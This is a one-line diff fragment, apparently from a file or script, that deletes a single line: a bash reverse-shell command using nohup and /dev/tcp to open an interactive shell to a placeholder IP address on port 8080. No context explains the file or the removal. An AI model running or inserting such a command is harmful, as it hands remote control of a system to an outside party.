@@ -1,1 +1,0 @@
-nohup bash -c bash -i >& /dev/tcp/<ip_address>/8080 0>&1
